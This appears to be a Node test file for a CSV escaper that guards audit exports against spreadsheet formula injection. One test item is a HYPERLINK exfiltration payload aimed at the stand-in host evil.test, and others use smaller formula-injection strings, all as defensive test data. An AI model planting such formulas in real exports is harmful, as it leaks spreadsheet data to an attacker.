import assert from 'node:assert/strict'
import { csvCell } from '../src/lib/csv.ts'

/**
 * Self-test for the audit CSV escaper (B-3).
 *
 * Why this is a test and not a review: the guard is a single regular expression.
 * A regex that is subtly wrong — `/[...]/` instead of `/^[...]/`, a missing `-`,
 * a class that silently swallows a range — reads as correct and fails only when a
 * real export is opened in a spreadsheet. The defect it fixes was exactly that: a
 * quoting rule that handled commas but let `=` through.
 *
 * Two families are asserted:
 *   - FORMULA prefixes are neutralised (`=`, `+`, `-`, `@`, tab, CR)
 *   - DELIMITERS are still quoted and inner quotes doubled (RFC 4180)
 * and one family must stay UNTOUCHED, so an ordinary export is unchanged.
 *
 * Run with `npm run audit:csv-selftest`.
 */

const pass = []
const fail = []
function check(name, fn) {
  try {
    fn()
    pass.push(name)
  } catch (err) {
    fail.push(`${name}: ${err instanceof Error ? err.message : String(err)}`)
  }
}

/* ---- 1. Formula injection is neutralised -------------------------------- */

check('= is neutralised', () => {
  assert.equal(csvCell('=1+1'), "'=1+1")
})
check('+ is neutralised', () => {
  assert.equal(csvCell('+44 77 0000'), "'+44 77 0000")
})
check('- is neutralised', () => {
  assert.equal(csvCell('-2+3'), "'-2+3")
})
check('@ is neutralised', () => {
  assert.equal(csvCell('@SUM(A1:A9)'), "'@SUM(A1:A9)")
})
check('tab is neutralised', () => {
  // A leading tab is how a formula is smuggled past a naive check. The value is
  // not quoted — a tab is not a CSV delimiter, so it needs no quoting — but it
  // MUST gain the guard, which is the part that defuses the formula.
  const out = csvCell('\t=1+1')
  assert.ok(out.startsWith("'"), 'a tab-prefixed cell must gain the guard')
})
check('the classic HYPERLINK payload is defused', () => {
  const payload = '=HYPERLINK("http://evil.test/?d="&A2,"click me")'
  const out = csvCell(payload)
  assert.ok(out.startsWith('"'), 'the cell must be quoted (it contains quotes and commas)')
  assert.ok(out.includes("'=HYPERLINK"), 'the formula must be prefixed with an apostrophe')
  // Every inner quote must be doubled, or the field ends early.
  assert.equal(out.replace(/^"|"$/g, '').includes('""'), true)
})

/* ---- 2. Delimiters are still handled ------------------------------------ */

check('a comma quotes the field', () => {
  assert.equal(csvCell('a,b'), '"a,b"')
})
check('an inner quote is doubled', () => {
  assert.equal(csvCell('say "hi"'), '"say ""hi"""')
})
check('a newline quotes the field', () => {
  assert.equal(csvCell('a\nb'), '"a\nb"')
})
check('a semicolon quotes the field', () => {
  assert.equal(csvCell('a;b'), '"a;b"')
})

/* ---- 3. Ordinary values are untouched ----------------------------------- */

check('a plain value is byte-identical', () => {
  assert.equal(csvCell('vpn.provision'), 'vpn.provision')
})
check('an e-mail is byte-identical', () => {
  assert.equal(csvCell('nimal@example.com'), 'nimal@example.com')
})
check('an empty value stays empty', () => {
  assert.equal(csvCell(''), '')
})
check('a mid-string = is not treated as a formula', () => {
  // Only a LEADING formula character is dangerous; `a=b` is plain text and
  // prefixing it would corrupt a legitimate value.
  assert.equal(csvCell('a=b'), 'a=b')
})

/* ---- report ------------------------------------------------------------- */

for (const p of pass) console.log(`PASS  ${p}`)
for (const f of fail) console.log(`FAIL  ${f}`)
console.log(`\nCSV ESCAPER ${fail.length === 0 ? 'OK' : 'FAILED'} — ${pass.length} passed, ${fail.length} failed`)
process.exit(fail.length === 0 ? 0 : 1)
